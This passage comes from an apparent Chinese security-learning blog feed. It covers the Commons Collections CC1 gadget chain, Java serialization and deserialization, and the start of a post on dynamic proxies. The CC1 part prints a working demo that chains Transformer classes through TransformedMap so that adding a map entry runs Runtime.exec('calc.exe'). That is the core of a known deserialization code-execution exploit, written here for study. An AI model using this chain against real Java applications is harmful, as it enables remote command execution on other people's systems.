ex);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样它就可以执行<code>input</code>对象的<code>iMethodName</code>⽅法了，原理其实也挺简单，就是利用反射先获取这个方法，然后再执行<code>input</code>对象中的这个方法就行了</p><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>前面我们讲了<code>ConstantTransformer</code>和<code>InvokerTransformer</code>两个类，一个可以返回一个类的对象，另一个可以执行对象中的方法，那么我们是不是就可以尝试执行<code>Runtime</code>类中的<code>exec</code>方法呢？很显然，我们还需要一个类将这两个串起来，让<code>ConstantTransformer</code>类返回的对象，能作为参数，进入到<code>InvokerTransformer</code>类的<code>transform</code>方法中，这样就可以了，这时候就需要拿出我们的<code>ChainedTransformer</code>类了；<code>ChainedTransformer</code>类同样也是实现了<code>Transformer</code>接口的一个类，它就是将内部多个实现了<code>Transformer</code>接口的类串在了一起，并且将前一个回调函数<code>transform</code>返回的结果，作为后一个回调函数<code>transform</code>的参数传入，看看它的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挺简单的一个逻辑，就是不停的调<code>transform</code>，接下来偷一张p神给的示意图：</p><p><img src="https://s2.loli.net/2022/02/03/CwRcyPjlBLDVUQ9.png" alt="image.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过前面提到的四个类，就可以实现一个cc1链简单的<code>demo</code>了，这个也是p神的原创代码，在这个<code>demo</code>中暂时还没有涉及反序列化的知识；我们再来理一理这个思路，再给出最终的代码：首先我们需要一个数组，这个数组中包含两个对象，一个是<code>ConstantTransformer</code>对象，用来返回<code>Runtime</code>对象；另一个是<code>InvokerTransformer</code>对象，用来执行<code>Runtime</code>对象中的<code>exec</code>方法；然后将这个数组用<code>ChainedTransformer</code>对象封装起来，让它构成一个回调；最后将这个<code>ChainedTransformer</code>对象用<code>TransformedMap.decorate</code>包装起来，包装成一个<code>Map</code>，当我们向这个<code>Map</code>中添加新元素时，就会调用<code>ChainedTransformer</code>对象中的<code>transform</code>方法，然后调用<code>ConstantTransformer</code>对象中的<code>transform</code>方法，最后调用<code>InvokerTransformer</code>对象中的<code>transform</code>方法，从而成功执行<code>exec</code>方法</p><p>接下来看完整代码，很多地方都有注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="comment">//Transformer是⼀个接⼝，只有⼀个待实现的⽅法transform，这里是创的一个数组，里面有两个元素</span></span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">            <span class="comment">//ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个对象，并在transform⽅法将这个对象再返回</span></span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">            <span class="comment">//InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键</span></span><br><span class="line">            <span class="comment">//实例化InvokerTransformer时，三个参数：第⼀个参数是待执⾏的⽅法名，第⼆个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表</span></span><br><span class="line">            <span class="comment">//这里的transform内有一个参数input，它就是执行input对象的待执⾏的⽅法，也就是返回上面的Runtime对象</span></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformerChain);</span><br><span class="line">        <span class="comment">//TransformedMap⽤于对Map做⼀个修饰，对innerMap进⾏修饰，传出的outerMap即是修饰后的Map</span></span><br><span class="line">        <span class="comment">//TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个回调</span></span><br><span class="line">        outerMap.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        <span class="comment">//被修饰过的Map在添加新的元素时，执⾏回调</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/03/Ur6KRABa5is29PD.png" alt="image.png"></p><p>在最后特别感谢p神大师傅的文章，因为文章在它知识星球里面所以我也没法发出来，但大家可以选择购买他的知识星球去里面看，里面有用的东西还是挺多的，像cc1链网上文章很多，但大多讲的都不是太清楚，容易看完之后很懵，但p神的文章思路就很清晰，写的很棒</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CommonsCollections-1-1&quot;&gt;&lt;a href=&quot;#CommonsCollections-1-1&quot; class=&quot;headerlink&quot; title=&quot;CommonsCollections  1  (1)&quot;&gt;&lt;/a&gt;CommonsCollections  1  (1)&lt;/h1&gt;&lt;p&gt;前面差不多把该梳理的基础知识梳理完了，那么接下来我们就正式进入到cc链的总结了，确实它比较难也不太好理解，但是借用p神的一句话就是逃不过的还是要学，CommonCollections利⽤链⼏乎是反序列化学习不可逃过的⼀关&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之Java序列化与反序列化</title>
    <link href="https://arsenetang.github.io/2022/01/19/Java%E7%AF%87%E4%B9%8BJava%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://arsenetang.github.io/2022/01/19/Java%E7%AF%87%E4%B9%8BJava%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-01-18T16:00:00.000Z</published>
    <updated>2022-03-09T12:31:04.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a>Java序列化与反序列化</h1><p>熟悉<code>PHP</code>反序列化的朋友肯定都对序列化和反序列化不陌生，在<code>PHP</code>中，序列化是将对象转换为字符串，而反之，反序列化则是将字符串变回为对象；而在<code>Java</code>中，逻辑还是这个逻辑，只不过实现的方式有一点点小小的不同，接下来我们就来讲讲<code>Java</code>中如何实现序列化与反序列化的</p><span id="more"></span><p>我们先来看看序列化的用途，其实主要就是两种用途：传输和保存；当两个进程在进行远程通信时，无论是传输哪种类型的数据，都是以二进制序列的形式在网络上传送的，那么发送方就需要先将Java对象转换为字节序列，而接收方再将字节序列恢复为Java对象；而保存最常见的例子就是Web服务器中的Session对象，当有10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中</p><p>在<code>PHP</code>中，可能相对比较简单，就是因为序列化后它生成的是字符串，我们可以直观的看到它里面的类与属性，然后反序列化也是直接将字符串变成对象，这样看着就很爽；但<code>Java</code>不同，序列化过后它并不是字符串，而是流的形式，如果直接用记事本打开的话会发现很多的乱码，看着就很不舒服，而反序列化也是将流转换为对象；而且在<code>PHP</code>中一个<code>serialize</code>，一个<code>unserialize</code>就可以实现，但在<code>Java</code>中会稍微复杂一点；但其实原理是差不多的，无论是<code>PHP</code>还是<code>Java</code>，都是将对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象，都是只能操作对象的属性的，接下来就来看看<code>Java</code>中具体的操作</p><h2 id="WriteObject"><a href="#WriteObject" class="headerlink" title="WriteObject"></a>WriteObject</h2><p><code>Java</code>中，<code>java.io.ObjectOutputStream</code>代表对象输出流，它里面的<code>writeObject(Object obj)</code>方法可对指定参数<code>obj</code>对象进行序列化，把得到的字节序列写到一个目标输出流中，而且只有实现了<code>Serializable</code>和<code>Externalizable</code>接口的类的对象才能被序列化，<code>Externalizable</code>接口是继承自<code>Serializable</code>接口的，实现<code>Externalizable</code>接口的类完全由自身来控制序列化的行为，而仅实现<code>Serializable</code>接口的类可以采用默认的序列化方式</p><p>所以说将对象序列化需要进行如下操作：</p><p>1.创建一个对象输出流<code>ObjectOutputStream</code>，它可以包装一个其他类型的目标输出流，如文件输出流、字节数组输出流等<br>2.通过对象输出流的<code>writeObject()</code>方法写对象</p><p>接下来我们来实际操作操作，先来写个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">student</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">student</span><span class="params">(<span class="keyword">int</span> age,String name,String sex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age=age;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">        <span class="keyword">this</span>.sex=sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们来写个主类，尝试创建一个对象并且序列化它，并将序列化后的结果输出出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        student obj = <span class="keyword">new</span> student(<span class="number">18</span>,<span class="string">&quot;Arsene.Tang&quot;</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oo.writeObject(obj);</span><br><span class="line">        System.out.println(obj.getName()+<span class="string">&quot;对象序列化成功！&quot;</span>);</span><br><span class="line">        oo.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/19/DwMpOcnUaubJyA2.png" alt="image.png"></p><p>可以看到，它就是传说中的字节数组流，然后通过调用<code>ObjectOutputStream</code>中的<code>writeObject</code>方法实现序列化</p><h2 id="ReadObject"><a href="#ReadObject" class="headerlink" title="ReadObject"></a>ReadObject</h2><p>既然有了序列化，那相应的肯定也就有反序列化，<code>java.io.ObjectInputStream</code>就代表对象输入流，它里面有个<code>readObject()</code>方法就可以从一个源输入流中读取字节序列，再把它反序列化成一个对象返回，所以说实现一个对象的反序列化，步骤如下：</p><p>1.创建一个对象输入流<code>ObjectInputStream</code>，它同样可以包装一个其它类型的输入流，比如文件输入流，字节数组输入流等</p><p>2.通过对象输入流的<code>readObject()</code>方法读取对象</p><p>接下来就来直接看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        student obj = <span class="keyword">new</span> student(<span class="number">18</span>,<span class="string">&quot;Arsene.Tang&quot;</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oo.writeObject(obj);</span><br><span class="line">        System.out.println(obj.getName()+<span class="string">&quot;对象序列化成功！&quot;</span>);</span><br><span class="line">        oo.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">        student s = (student) o;</span><br><span class="line">        System.out.println(s.getName()+<span class="string">&quot;对象反序列化成功！&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;您的姓名为：&quot;</span>+s.getName()+<span class="string">&quot; 您的年龄为：&quot;</span>+s.getAge()+<span class="string">&quot; 您的性别为：&quot;</span>+s.getSex());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是创建一个对象输入流<code>ois</code>，里面包装了一个字节数组输入流，然后将它反序列化成一个对象<code>o</code>，再通过强制类型转换将它转换为<code>student</code>类型，接下来就可以正常使用这个<code>student</code>对象了，看看运行结果：</p><p><img src="https://s2.loli.net/2022/01/19/TJjgxvymrZREOaS.png" alt="image.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下就是当需要序列化时，先创建<code>ObjectOutputStream</code>对象，再调用里面的<code>writeObject()</code>方法；当需要反序列化时，则先创建<code>ObjectInputStream</code>对象，再调用里面的<code>readObject()</code>方法即可，当然需要注意的就是只有继承了<code>Serializable</code>接口的类才能被序列化哈，这在后面cc链的分析中还是挺重要的</p><p>参考文章：</p><p><a href="https://www.cnblogs.com/xdp-gacl/p/3777987.html">https://www.cnblogs.com/xdp-gacl/p/3777987.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Java序列化与反序列化&quot;&gt;&lt;a href=&quot;#Java序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;Java序列化与反序列化&quot;&gt;&lt;/a&gt;Java序列化与反序列化&lt;/h1&gt;&lt;p&gt;熟悉&lt;code&gt;PHP&lt;/code&gt;反序列化的朋友肯定都对序列化和反序列化不陌生，在&lt;code&gt;PHP&lt;/code&gt;中，序列化是将对象转换为字符串，而反之，反序列化则是将字符串变回为对象；而在&lt;code&gt;Java&lt;/code&gt;中，逻辑还是这个逻辑，只不过实现的方式有一点点小小的不同，接下来我们就来讲讲&lt;code&gt;Java&lt;/code&gt;中如何实现序列化与反序列化的&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之Java动态代理</title>
    <link href="https://arsenetang.github.io/2022/01/15/Java%E7%AF%87%E4%B9%8BJava%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <id>https://arsenetang.github.io/2022/01/15/Java%E7%AF%87%E4%B9%8BJava%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</id>
    <published>2022-01-14T16:00:00.000Z</published>
    <updated>2022-01-15T18:10:42.209Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>害前段时间应付该死的学校考试，差不多一个多月的时间没咋学技术吧，就很烦，不过好在结果是好的嘛，现在总算是考完了，可以回家放松放松顺便学学技术了；复习考试之前的那段时间一直在学Java安全，差不多把cc1的链子看完了，确实挺难的，有好多好多要讲到的小东西，接下来就先来总结动态代理吧，相信把好多知识点掰细了它也就不难了</p><span id="more"></span><h2 id="Java代理模式"><a href="#Java代理模式" class="headerlink" title="Java代理模式"></a>Java代理模式</h2><p>代理是什么？其实我们生活中也有许多代理的例子，比如说房东要将房子出售，于是到房地产中介公司找一个中介（代理），由他来帮房东完成销售房屋，签订合同、网签、贷款过户等等事宜，而买家也是和这个中介进行谈判的；也就是说，代理本身是不会真正实现具体的服务的，它做的只是一个搭桥的工作</p><p>而在Java中，我们首先是需要一个被代理的接口，以及代理类<code>(Proxy)</code>和真正的实现类<code>(Real)</code>，它们都会去同时继承这个接口，但是用户只能接触到代理类；在用户调用代理类时，代理类在内部调用了实现类，也可以实现一些其它的操作，然后将结果返回给了用户；代理又分为静态代理和动态代理两种，接下来就来看看这两种，当然重点肯定是动态代理哈</p><p><img src="https://s2.loli.net/2022/01/16/OYJzPF3fpMmT6xD.png" alt="image.png"></p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理就是代理类是之前就已经写好了的，来举个例子，先来个接口<code>flag</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后写它的实现类<code>getflag</code>，并且继承这个接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">getflag</span> <span class="keyword">implements</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getflag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Give you flag: flag&#123;wllm_yyds&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是代理类<code>Proxy</code>，它同样会继承<code>flag</code>接口，并且它拥有实现类的对象，代为执行里面的方法，就是因为这种间接性，可以附加多种用途，比如说在调用的前后都可以加入一些代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    flag flag;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Proxy</span><span class="params">(flag flag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag=flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getflag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是你的flag&quot;</span>);</span><br><span class="line">        flag.getflag();</span><br><span class="line">        System.out.println(<span class="string">&quot;请拿好&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们就来创建主类了，在主类中我们先创建一个实现类的对象，然后交给代理类，让代理类来执行里面的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test11</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        flag flag = <span class="keyword">new</span> getflag();</span><br><span class="line">        Proxy p = <span class="keyword">new</span> Proxy(flag);</span><br><span class="line">        p.getflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/16/Ad8Pq1l9f7iMpvY.png" alt="image.png"></p><p>这就是所谓的静态代理，我们可以看到，通过代理，我们可以拓展一些新的功能，而且防止了用户直接操作目标对象，提升了安全性；但是缺点也很明显，由于代理类是之前就写好了的，很固定，所以说降低了灵活性；而且代理类和实现类还需要共同实现一个接口或者说共同继承某个类，当类很多时这就很不方便，而且一旦改变了接口的内容，代理类和实现类都需要发生变化</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>静态代理的代理类是由程序员手写的，而动态代理则不同，动态代理的代理类字节码则是在程序运行时由Java反射机制动态生成的，这就会方便而且灵活很多，因为Java反射机制可以生成任意类型的动态代理类嘛，<code>java.lang.reflect</code> 包中的 Proxy类和<code>InvocationHandler</code> 接口又提供了生成动态代理类的能力，接下来我们就来看实例：</p><p>接口和接口的实现类还是和上面一样，这里为了演示动态代理我们多添加一个接口<code>flag1</code>以及它的实现类<code>getflag1</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">getflag</span> <span class="keyword">implements</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getflag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Give you flag: flag&#123;wllm_yyds&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">flag1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">getflag1</span> <span class="keyword">implements</span> <span class="title">flag1</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getflag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is your flag:flag&#123;Welc0me_to_WLLMCTF&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态代理类肯定需要实现<code>InvocationHandler</code>接口的，然后里面只用重写一个<code>invoke</code>方法就行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 